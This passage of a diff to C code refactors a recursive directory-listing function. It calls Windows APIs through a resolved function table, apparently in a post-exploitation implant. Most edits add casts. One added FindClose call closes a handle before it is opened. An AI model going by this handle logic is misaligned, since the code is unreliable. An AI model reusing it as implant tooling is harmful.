-        hFile = Instance->Win32.FindFirstFileW( Path, &FindData );
+        ((INSTANCE *)Instance)->Win32.FindClose( hFile );
+        hFile = ((INSTANCE *)Instance)->Win32.FindFirstFileW( Path, &FindData );
         if ( hFile == INVALID_HANDLE_VALUE )
         {
             PRINTF( "FindFirstFileW failed for path %ls\n", Path );
@@ -1547,7 +1547,7 @@ PROOT_DIR listDir(
     }
 
     // allocate the RootDir
-    RootDir = Instance->Win32.LocalAlloc( LPTR, sizeof( ROOT_DIR ) );
+    RootDir = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( ROOT_DIR ) );
     if ( ! RootDir )
     {
         PUTS( "Failed to allocate memory" );
@@ -1584,7 +1584,7 @@ PROOT_DIR listDir(
         // if we are interested in subdirs, remember that we found this directory
         if ( IsDir && SubDirs )
         {
-            SubDir = Instance->Win32.LocalAlloc( LPTR, sizeof( SUB_DIR ) );
+            SubDir = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( SUB_DIR ) );
             if ( ! SubDir )
             {
                 PUTS( "Failed to allocate memory" );
@@ -1635,15 +1635,15 @@ PROOT_DIR listDir(
         }
 
         // save this directory or file
-        DirOrFile = Instance->Win32.LocalAlloc( LPTR, sizeof( DIR_OR_FILE ) );
+        DirOrFile = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( DIR_OR_FILE ) );
         if ( ! DirOrFile )
         {
             PUTS( "Failed to allocate memory" );
             goto Cleanup;
         }
 
-        Instance->Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &DirOrFile->FileTime );
-        Instance->Win32.SystemTimeToTzSpecificLocalTime( 0, &DirOrFile->FileTime, &DirOrFile->SystemTime );
+        ((INSTANCE *)Instance)->Win32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &DirOrFile->FileTime );
+        ((INSTANCE *)Instance)->Win32.SystemTimeToTzSpecificLocalTime( 0, &DirOrFile->FileTime, &DirOrFile->SystemTime );
 
         DirOrFile->IsDir = IsDir;
 
@@ -1670,7 +1670,7 @@ PROOT_DIR listDir(
         }
         LastDirOrFile = DirOrFile;
     }
-    while ( Instance->Win32.FindNextFileW( hFile, &FindData ) );
+    while ( ((INSTANCE *)Instance)->Win32.FindNextFileW( hFile, &FindData ) );
 
     // list all subdirs recursively if requested
     SubDir  = RootSubDir;
@@ -1696,7 +1696,7 @@ PROOT_DIR listDir(
 
 Cleanup:
     if ( hFile )
-        Instance->Win32.FindClose( hFile );
+        ((INSTANCE *)Instance)->Win32.FindClose( hFile );
 
     DATA_FREE( Path, ( MAX_PATH + 2 + 1 ) * sizeof( WCHAR ) );
 
